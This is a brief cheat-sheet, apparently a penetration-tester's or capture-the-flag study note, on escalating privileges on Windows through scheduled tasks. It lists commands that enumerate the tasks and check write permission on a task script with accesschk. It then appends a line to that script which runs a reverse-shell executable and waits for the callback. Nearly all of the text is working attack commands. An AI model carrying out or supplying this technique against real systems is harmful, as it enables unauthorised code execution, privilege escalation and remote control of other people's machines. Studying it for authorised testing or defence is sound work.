List all scheduled tasks your user can see:


schtasks /query /fo LIST /v


in powershell

PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName, TaskPath, State

Often we have to rely on other clues, such as finding a script or log file that indicates a scheduled task is being run.



Find the interesting file that probably run with schedule
(ex: CleanUp.ps1)


Verify the access

.\accesschk.exe /accepteula -quv user CleanUp.ps1

check: FILE_APPEND_DATA or FILE_WRITE_DATA

backup the script


echo C:\<user>\reverse.exe >> CleanUp.ps1

wait the response
